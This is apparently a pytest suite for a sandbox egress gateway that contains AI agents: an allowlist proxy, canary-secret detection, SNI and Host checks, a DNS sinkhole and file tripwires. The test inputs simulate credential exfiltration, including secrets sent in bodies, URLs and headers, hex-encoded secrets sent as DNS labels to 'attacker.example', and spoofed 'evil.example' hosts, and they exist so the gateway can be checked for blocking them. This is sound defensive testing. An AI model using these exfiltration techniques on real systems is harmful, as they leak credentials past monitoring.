import asyncio
import base64
import contextlib
import json
import socket
import struct
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import ClassVar

import pytest

from agent_sandbox.allowlist import Allowlist
from agent_sandbox.canary import CanaryMatcher, generate
from agent_sandbox.gateway import dns
from agent_sandbox.gateway.alerts import EventLog
from agent_sandbox.gateway.proxy import Proxy, parse_head, split_host_port
from agent_sandbox.gateway.tls import MAX_HELLO, hello_complete, server_name
from agent_sandbox.gateway.tripwire import Tripwire, parse_events, seed


@pytest.fixture
def canaries():
    return generate()


@pytest.fixture
def log(tmp_path):
    return EventLog(tmp_path / "logs", stream=None)


def read_jsonl(path):
    return (
        [json.loads(line) for line in path.read_text(encoding="utf-8").splitlines()]
        if path.exists()
        else []
    )


class Upstream(BaseHTTPRequestHandler):
    received: ClassVar[list] = []

    def log_message(self, *args):
        pass

    def _body(self):
        if self.headers.get("Transfer-Encoding", "").lower() == "chunked":
            body = b""
            while size := int(self.rfile.readline().split(b";")[0], 16):
                body += self.rfile.read(size)
                self.rfile.readline()
            while self.rfile.readline() not in (b"\r\n", b""):
                pass
            return body
        return self.rfile.read(int(self.headers.get("Content-Length") or 0))

    def _respond(self):
        body = self._body()
        Upstream.received.append((self.command, self.path, body, dict(self.headers)))
        payload = b"hello from upstream"
        self.send_response(200)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    do_GET = do_POST = do_PUT = do_DELETE = _respond


class KeepAliveUpstream(Upstream):
    protocol_version = "HTTP/1.1"


def _serve(handler):
    Upstream.received = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


@pytest.fixture
def upstream():
    server = _serve(Upstream)
    yield server.server_address[1]
    server.shutdown()
    server.server_close()


@pytest.fixture
def keepalive_upstream():
    server = _serve(KeepAliveUpstream)
    yield server.server_address[1]
    server.shutdown()
    server.server_close()


class ProxyHarness:
    """Runs the proxy on an event loop in a background thread."""

    def __init__(self, allow, canaries, log, **options):
        self.proxy = Proxy(
            Allowlist(allow), CanaryMatcher(canaries), log, connect_timeout=5, **options
        )
        self.loop = asyncio.new_event_loop()
        ready = threading.Event()

        async def start():
            self.server = await asyncio.start_server(self.proxy.handle, "127.0.0.1", 0)
            self.port = self.server.sockets[0].getsockname()[1]
            ready.set()

        threading.Thread(target=self.loop.run_forever, daemon=True).start()
        asyncio.run_coroutine_threadsafe(start(), self.loop)
        ready.wait(5)

    def raw(self, data: bytes, read_after: bytes | None = None) -> bytes:
        with socket.create_connection(("127.0.0.1", self.port), timeout=5) as sock:
            sock.sendall(data)
            if read_after is not None:
                sock.recv(4096)
                sock.sendall(read_after)
            sock.shutdown(socket.SHUT_WR)
            chunks = []
            with contextlib.suppress(TimeoutError, OSError):
                while chunk := sock.recv(65536):
                    chunks.append(chunk)
        return b"".join(chunks)

    def close(self):
        self.loop.call_soon_threadsafe(self.server.close)
        self.loop.call_soon_threadsafe(self.loop.stop)


@pytest.fixture
def harness(canaries, log):
    made = []

    def _make(allow=("127.0.0.1",), **options):
        h = ProxyHarness(list(allow), canaries, log, **options)
        made.append(h)
        return h

    yield _make
    for h in made:
        h.close()


def test_parse_helpers():
    request = parse_head(b"GET http://x.example/ HTTP/1.1\r\nHost: x.example\r\nA: b\r\n\r\n")
    assert request.method == "GET" and request.header("a") == "b"
    assert split_host_port("example.com:8443", 443) == ("example.com", 8443)
    assert split_host_port("[::1]:80", 443) == ("::1", 80)
    assert split_host_port("example.com", 443) == ("example.com", 443)
    with pytest.raises(ValueError):
        split_host_port("not a host:1", 443)


def test_plain_http_allowed_and_forwarded(harness, upstream, log):
    h = harness([f"127.0.0.1:{upstream}"])
    response = h.raw(
        f"GET http://127.0.0.1:{upstream}/simple/ HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        "Proxy-Connection: keep-alive\r\n\r\n".encode()
    )
    assert response.startswith(b"HTTP/1.0 200") and response.endswith(b"hello from upstream")
    method, path, _, headers = Upstream.received[0]
    assert (method, path) == ("GET", "/simple/") and "Proxy-Connection" not in headers
    assert read_jsonl(log.directory / "events.jsonl")[-1]["kind"] == "egress.allowed"


def test_denied_host(harness, upstream, log):
    h = harness([])
    response = h.raw(f"GET http://127.0.0.1:{upstream}/ HTTP/1.1\r\n\r\n".encode())
    assert response.startswith(b"HTTP/1.1 403") and b"not in the allowlist" in response
    assert not Upstream.received
    assert read_jsonl(log.directory / "events.jsonl")[-1]["kind"] == "egress.denied"
    assert not (log.directory / "alerts.jsonl").exists()


@pytest.mark.parametrize("encode", ["plain", "base64"])
def test_canary_in_body_is_blocked_and_alerted(harness, upstream, canaries, log, encode):
    secret = next(c for c in canaries if c.kind == "aws").secrets[1]
    body = secret.encode() if encode == "plain" else base64.b64encode(b"k=" + secret.encode())
    h = harness([f"127.0.0.1:{upstream}"])
    response = h.raw(
        f"POST http://127.0.0.1:{upstream}/upload HTTP/1.1\r\nContent-Length: {len(body)}\r\n"
        "\r\n".encode()
        + body
    )
    assert response.startswith(b"HTTP/1.1 403") and b"canary" in response
    assert not Upstream.received
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["kind"] == "canary.exfiltration" and alert["severity"] == "critical"
    assert alert["canary_kind"] == "aws" and secret not in json.dumps(alert)


def test_chunked_body_and_expect_continue(harness, upstream, canaries):
    secret = next(c for c in canaries if c.kind == "github").secrets[0].encode()
    h = harness([f"127.0.0.1:{upstream}"])
    chunked = b"5\r\nhello\r\n" + f"{len(secret):x}".encode() + b"\r\n" + secret + b"\r\n0\r\n\r\n"
    head = (
        f"POST http://127.0.0.1:{upstream}/x HTTP/1.1\r\nTransfer-Encoding: chunked\r\n"
        "Expect: 100-continue\r\n\r\n"
    ).encode()
    response = h.raw(head, read_after=chunked)
    assert b"403" in response.split(b"\r\n")[0]
    clean = b"5\r\nhello\r\n0\r\n\r\n"
    response = h.raw(head, read_after=clean)
    assert response.endswith(b"hello from upstream")
    assert Upstream.received[-1][2] == b"hello"


def test_method_and_path_rules_on_plain_http(harness, upstream, log):
    target = f"127.0.0.1:{upstream}"
    h = harness(
        [
            {"host": target, "methods": ["GET"]},
            {"host": target, "methods": ["POST"], "paths": ["/api/*"]},
        ]
    )
    assert h.raw(f"GET http://{target}/x HTTP/1.1\r\n\r\n".encode()).endswith(b"upstream")
    post = f"POST http://{target}/api/items HTTP/1.1\r\nContent-Length: 2\r\n\r\nok"
    assert h.raw(post.encode()).endswith(b"upstream")
    denied = h.raw(f"DELETE http://{target}/x HTTP/1.1\r\n\r\n".encode())
    assert denied.startswith(b"HTTP/1.1 403") and b"DELETE /x is not allowed" in denied
    other = f"POST http://{target}/other HTTP/1.1\r\nContent-Length: 2\r\n\r\nok"
    assert h.raw(other.encode()).startswith(b"HTTP/1.1 403")
    assert [r[0] for r in Upstream.received] == ["GET", "POST"]
    event = read_jsonl(log.directory / "events.jsonl")[-1]
    assert event["kind"] == "egress.denied" and event["path"] == "/other"
    assert not (log.directory / "alerts.jsonl").exists()


def test_plain_http_host_header_must_match(harness, upstream, log):
    h = harness([f"127.0.0.1:{upstream}"])
    request = f"GET http://127.0.0.1:{upstream}/ HTTP/1.1\r\nHost: evil.example\r\n\r\n"
    assert h.raw(request.encode()).startswith(b"HTTP/1.1 403")
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["kind"] == MISMATCH and alert["requested"] == f"evil.example:{upstream}"
    assert not Upstream.received


@pytest.mark.parametrize(
    "framing",
    [
        "Content-Length: 2\r\nTransfer-Encoding: chunked",
        "Transfer-Encoding: gzip, chunked",
        "Content-Length: 2\r\nContent-Length: 3",
    ],
)
def test_ambiguous_body_framing_is_refused(harness, upstream, framing):
    h = harness([f"127.0.0.1:{upstream}"])
    request = f"POST http://127.0.0.1:{upstream}/ HTTP/1.1\r\n{framing}\r\n\r\nok"
    assert h.raw(request.encode())[:12] in (b"HTTP/1.1 400", b"HTTP/1.1 501")
    assert not Upstream.received


def test_canary_in_url_and_headers(harness, upstream, canaries):
    token = next(c for c in canaries if c.kind == "git").secrets[0]
    h = harness([f"127.0.0.1:{upstream}"])
    target = f"http://127.0.0.1:{upstream}"
    in_url = f"GET {target}/?t={token} HTTP/1.1\r\n\r\n"
    in_header = f"GET {target}/ HTTP/1.1\r\nAuthorization: Bearer {token}\r\n\r\n"
    assert h.raw(in_url.encode()).startswith(b"HTTP/1.1 403")
    assert h.raw(in_header.encode()).startswith(b"HTTP/1.1 403")
    assert not Upstream.received


def test_canary_hostname_is_blocked(harness, canaries, log):
    host = next(c for c in canaries if c.kind == "url").hosts[0]
    h = harness([host])
    assert h.raw(f"CONNECT {host}:443 HTTP/1.1\r\n\r\n".encode()).startswith(b"HTTP/1.1 403")
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["kind"] == "canary.exfiltration" and alert["canary_kind"] == "url"


def test_connect_tunnel_scans_plaintext(harness, upstream, canaries, log):
    secret = next(c for c in canaries if c.kind == "netrc").secrets[0]
    h = harness([f"127.0.0.1:{upstream}"])
    ok = h.raw(
        f"CONNECT 127.0.0.1:{upstream} HTTP/1.1\r\n\r\n".encode(),
        read_after=b"GET /t HTTP/1.1\r\nHost: x\r\n\r\n",
    )
    assert b"hello from upstream" in ok
    blocked = h.raw(
        f"CONNECT 127.0.0.1:{upstream} HTTP/1.1\r\n\r\n".encode(),
        read_after=f"POST /t HTTP/1.1\r\nContent-Length: 28\r\n\r\n{secret}".encode(),
    )
    assert b"hello from upstream" not in blocked
    assert read_jsonl(log.directory / "alerts.jsonl")[-1]["where"] == "tunnel data"


def _restricted(port, *rules):
    target = f"127.0.0.1:{port}"
    return [{"host": target, **rule} for rule in rules] or [target]


def test_restricted_plaintext_tunnel_relays_requests(harness, keepalive_upstream, log):
    port = keepalive_upstream
    h = harness(_restricted(port, {"methods": ["GET", "POST"]}))
    big = b"x" * 200_000
    requests = (
        f"GET /one HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n\r\n"
        f"POST /two HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nContent-Length: {len(big)}\r\n"
        "Proxy-Authorization: Basic eDp5\r\n\r\n"
    ).encode() + big
    response = h.raw(f"CONNECT 127.0.0.1:{port} HTTP/1.1\r\n\r\n".encode(), read_after=requests)
    assert response.count(b"hello from upstream") == 2
    (get, post) = Upstream.received
    assert (get[0], get[1], post[0], post[1]) == ("GET", "/one", "POST", "/two")
    assert post[2] == big and "Proxy-Authorization" not in post[3]
    events = [
        e for e in read_jsonl(log.directory / "events.jsonl") if e["kind"] == "egress.request"
    ]
    assert [(e["method"], e["path"], e["tls"]) for e in events] == [
        ("GET", "/one", False),
        ("POST", "/two", False),
    ]


MISMATCH = "egress.host_mismatch"
HOST = "Host: {target}\r\n"


@pytest.mark.parametrize(
    ("request_text", "status", "alert"),
    [
        ("DELETE /x HTTP/1.1\r\n" + HOST + "\r\n", b"403", None),
        ("GET /x HTTP/1.1\r\nHost: evil.example\r\n\r\n", b"403", MISMATCH),
        ("GET http://evil.example/ HTTP/1.1\r\n" + HOST + "\r\n", b"403", MISMATCH),
        ("GET /x HTTP/1.1\r\n\r\n", b"400", None),
        ("GET /x HTTP/1.1\r\n" + HOST + "Upgrade: websocket\r\n\r\n", b"501", None),
        ("CONNECT {target} HTTP/1.1\r\n" + HOST + "\r\n", b"400", None),
        ("SSH-2.0-OpenSSH_9.6\r\n\r\n", b"400", None),
        ("GET /x HTTP/1.1\r\n" + HOST + "Transfer-Encoding: chunked\r\n\r\n0x1\r\n", b"400", None),
    ],
)
def test_restricted_plaintext_tunnel_refusals(harness, upstream, log, request_text, status, alert):
    target = f"127.0.0.1:{upstream}"
    h = harness(_restricted(upstream, {"methods": ["GET"]}))
    response = h.raw(
        f"CONNECT {target} HTTP/1.1\r\n\r\n".encode(),
        read_after=request_text.format(target=target).encode(),
    )
    assert response.startswith(b"HTTP/1.1 " + status), response[:80]
    assert b"agent-sandbox gateway" in response
    assert not Upstream.received
    alerts = [a["kind"] for a in read_jsonl(log.directory / "alerts.jsonl")]
    assert alerts == ([alert] if alert else [])


def test_canary_split_across_chunks_is_never_released(harness, upstream, canaries, log):
    secret = next(c for c in canaries if c.kind == "github").secrets[0].encode()
    target = f"127.0.0.1:{upstream}"
    h = harness(_restricted(upstream, {"methods": ["POST"]}))
    first, second = b"prefix-" + secret[:20], secret[20:] + b"-suffix"
    body = b"%x\r\n%s\r\n%x\r\n%s\r\n0\r\n\r\n" % (len(first), first, len(second), second)
    request = (
        f"POST /x HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: chunked\r\n\r\n".encode() + body
    )
    response = h.raw(f"CONNECT {target} HTTP/1.1\r\n\r\n".encode(), read_after=request)
    assert response.startswith(b"HTTP/1.1 403") and b"canary" in response
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["where"] == "request body" and alert["tls"] is False
    assert all(secret[:20] not in r[2] for r in Upstream.received)


def test_restricted_tunnel_chunked_body_is_rechunked(harness, upstream):
    target = f"127.0.0.1:{upstream}"
    h = harness(_restricted(upstream, {"methods": ["PUT"], "paths": ["/files/*"]}))
    body = b"5;ext=1\r\nhello\r\n6\r\n world\r\n0\r\nX-Trailer: 1\r\n\r\n"
    request = (
        f"PUT /files/a HTTP/1.1\r\nHost: {target}\r\nTransfer-Encoding: chunked\r\n\r\n"
    ).encode() + body
    response = h.raw(f"CONNECT {target} HTTP/1.1\r\n\r\n".encode(), read_after=request)
    assert response.endswith(b"hello from upstream")
    assert Upstream.received[0][2] == b"hello world"


def test_connect_denied_and_unreachable(harness, log):
    h = harness(["127.0.0.1:9"])
    assert h.raw(b"CONNECT pypi.org:443 HTTP/1.1\r\n\r\n").startswith(b"HTTP/1.1 403")
    assert h.raw(b"CONNECT 127.0.0.1:9 HTTP/1.1\r\n\r\n").startswith(b"HTTP/1.1 502")
    assert h.raw(b"BROKEN\r\n\r\n").startswith(b"HTTP/1.1 400")
    assert h.raw(b"GET ftp://x.example/ HTTP/1.1\r\n\r\n").startswith(b"HTTP/1.1 400")


def _client_hello(sni: str) -> bytes:
    name = sni.encode()
    sni_ext = struct.pack("!HHHBH", 0, len(name) + 5, len(name) + 3, 0, len(name)) + name
    body = b"\x03\x03" + b"\0" * 32 + b"\x00" + b"\x00\x02\x13\x01" + b"\x01\x00"
    body += struct.pack("!H", len(sni_ext)) + sni_ext
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + struct.pack("!H", len(handshake)) + handshake


def test_sni_parsing_and_mismatch(harness, upstream, log):
    assert server_name(_client_hello("pypi.org")) == "pypi.org"
    assert server_name(b"\x16\x03\x01\x00") is None
    assert server_name(b"GET / HTTP/1.1") is None
    h = harness([f"127.0.0.1:{upstream}"])
    h.raw(
        f"CONNECT 127.0.0.1:{upstream} HTTP/1.1\r\n\r\n".encode(),
        read_after=_client_hello("evil.example"),
    )
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["kind"] == "egress.sni_mismatch" and alert["sni"] == "evil.example"


def _fragmented_hello(sni: str, size: int = 20) -> bytes:
    """The same ClientHello split over several TLS records of ``size`` bytes."""
    handshake = _client_hello(sni)[5:]
    return b"".join(
        b"\x16\x03\x01" + struct.pack("!H", len(part)) + part
        for part in (handshake[i : i + size] for i in range(0, len(handshake), size))
    )


def test_hello_reassembly():
    hello = _fragmented_hello("pypi.org")
    assert server_name(hello) == "pypi.org"
    assert not hello_complete(hello[:30]) and hello_complete(hello)
    assert hello_complete(b"\x16\x03\x01\x00\x01\x01" + b"\x17\x03\x03\x00\x00")  # not handshake
    assert hello_complete(b"\x16\x03\x01\xff\xff" + b"\0" * MAX_HELLO)
    assert server_name(_fragmented_hello("pypi.org")[:-3]) is None


def test_sni_check_survives_split_hello(harness, upstream, log):
    h = harness([f"127.0.0.1:{upstream}"])
    hello = _fragmented_hello("evil.example", size=7)
    with socket.create_connection(("127.0.0.1", h.port), timeout=5) as sock:
        sock.sendall(f"CONNECT 127.0.0.1:{upstream} HTTP/1.1\r\n\r\n".encode())
        assert sock.recv(4096).startswith(b"HTTP/1.1 200")
        sock.sendall(hello[:9])
        time.sleep(0.2)
        sock.sendall(hello[9:])
        with contextlib.suppress(OSError):
            while sock.recv(4096):
                pass
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["kind"] == "egress.sni_mismatch" and alert["sni"] == "evil.example"


def test_dns_sinkhole(canaries, log):
    def query(name: str, qtype: int = 1) -> bytes:
        labels = b"".join(bytes([len(p)]) + p.encode() for p in name.split("."))
        return (
            struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
            + labels
            + b"\0"
            + struct.pack("!HH", qtype, 1)
        )

    packet = query("pypi.org")
    assert dns.parse_query(packet)[2:4] == ("pypi.org", 1)
    response = dns.build_response(packet, dns.NXDOMAIN)
    query_id, flags, qd, an = struct.unpack_from("!HHHH", response)
    assert (query_id, flags & 0xF, qd, an) == (0x1234, 3, 1, 0) and flags & 0x8000
    assert dns.build_response(b"\x00\x01\x00", dns.NXDOMAIN)[3] & 0xF == dns.FORMERR

    protocol = dns.SinkholeProtocol(CanaryMatcher(canaries), log)
    sent = []

    class Transport:
        def sendto(self, data, addr):
            sent.append(data)

    protocol.connection_made(Transport())
    protocol.datagram_received(packet, ("172.31.250.3", 5353))
    secret = next(c for c in canaries if c.kind == "dotenv").secrets[1].encode().hex()
    protocol.datagram_received(
        query(f"{secret[:40]}.{secret[40:]}.x.attacker.example", 16), ("1.2.3.4", 1)
    )
    assert len(sent) == 2
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["kind"] == "canary.dns" and alert["encoding"] == "hex"


def test_seed_writes_files_with_modes(tmp_path, canaries):
    paths = seed(tmp_path / "home", canaries, 1000, 1000)
    assert len(paths) == len(canaries)
    aws = next(p for p in paths if p.name == "credentials")
    assert "aws_access_key_id" in aws.read_text(encoding="utf-8")
    if sys.platform != "win32":
        assert oct(aws.stat().st_mode & 0o777) == "0o600"


def test_seed_rejects_escaping_paths(tmp_path, canaries):
    from dataclasses import replace

    evil = replace(canaries[0], path="../outside")
    with pytest.raises(ValueError, match="escapes"):
        seed(tmp_path / "home", [evil], 1000, 1000)


def test_tripwire_events_and_debounce(canaries, log, tmp_path):
    header = struct.pack("iIII", 7, 0x20, 0, 0) + struct.pack("iIII", 8, 0x1, 0, 16) + b"\0" * 16
    assert parse_events(header) == [(7, 0x20), (8, 0x1)]
    wire = Tripwire({tmp_path / "x": canaries[0]}, log)
    wire.triggered(tmp_path / "x", canaries[0])
    wire.triggered(tmp_path / "x", canaries[0])  # debounced
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["kind"] == "canary.file_access" and alert["severity"] == "warning"


@pytest.mark.skipif(sys.platform != "linux", reason="inotify is Linux-only")
def test_tripwire_detects_reads(tmp_path, canaries, log):
    import time

    paths = seed(tmp_path / "home", canaries[:1], 1000, 1000)
    wire = Tripwire({paths[0]: canaries[0]}, log)
    assert wire.arm(), read_jsonl(log.directory / "events.jsonl")
    wire.start()
    paths[0].read_text(encoding="utf-8")
    for _ in range(50):
        if (log.directory / "alerts.jsonl").exists():
            break
        time.sleep(0.1)
    assert read_jsonl(log.directory / "alerts.jsonl")[0]["kind"] == "canary.file_access"


def test_alert_validation_and_webhook_failure(tmp_path):
    log = EventLog(tmp_path, webhook="http://127.0.0.1:9/hook", stream=None)
    with pytest.raises(ValueError):
        log.alert("x", "fatal", "y")
    log._notify({"severity": "critical", "message": "m"})
    assert read_jsonl(tmp_path / "events.jsonl")[-1]["kind"] == "alert.webhook_failed"


@pytest.mark.parametrize(
    ("address", "public"),
    [
        ("93.184.216.34", True),
        ("2606:4700::1111", True),
        ("127.0.0.1", False),
        ("10.1.2.3", False),
        ("169.254.169.254", False),
        ("100.64.0.1", False),
        ("::1", False),
        ("fe80::1%eth0", False),
        ("::ffff:192.168.1.1", False),
        ("224.0.0.1", False),
    ],
)
def test_is_public(address, public):
    from agent_sandbox.gateway.proxy import is_public

    assert is_public(address) is public


def test_resolution_refuses_private_targets(monkeypatch, canaries, log):
    from agent_sandbox.gateway.proxy import ProxyError

    answers = {
        "rebind.example": ["127.0.0.1", "169.254.169.254"],
        "mixed.example": ["2606:4700::1111", "10.0.0.5", "93.184.216.34"],
    }

    def fake_getaddrinfo(host, port, *args, **kwargs):
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port)) for a in answers[host]]

    monkeypatch.setattr(socket, "getaddrinfo", fake_getaddrinfo)
    proxy = Proxy(Allowlist([]), CanaryMatcher(canaries), log)
    with pytest.raises(ProxyError) as info:
        asyncio.run(proxy._resolve("rebind.example", 443))
    assert info.value.status == 403
    (alert,) = read_jsonl(log.directory / "alerts.jsonl")
    assert alert["kind"] == "egress.private_address"
    assert asyncio.run(proxy._resolve("mixed.example", 443)) == [
        "93.184.216.34",
        "2606:4700::1111",
    ]
    assert asyncio.run(proxy._resolve("10.9.8.7", 443)) == ["10.9.8.7"]  # explicit literal


def test_dns_alerts_are_debounced(canaries, log):
    secret = next(c for c in canaries if c.kind == "aws").secrets[0].encode().hex()
    protocol = dns.SinkholeProtocol(CanaryMatcher(canaries), log)
    for qtype in (1, 28):
        labels = b"".join(bytes([len(p)]) + p.encode() for p in (secret, "x", "example"))
        packet = struct.pack("!HHHHHH", 1, 0x0100, 1, 0, 0, 0) + labels + b"\0"
        protocol.datagram_received(packet + struct.pack("!HH", qtype, 1), ("1.2.3.4", 1))
    assert len(read_jsonl(log.directory / "alerts.jsonl")) == 1
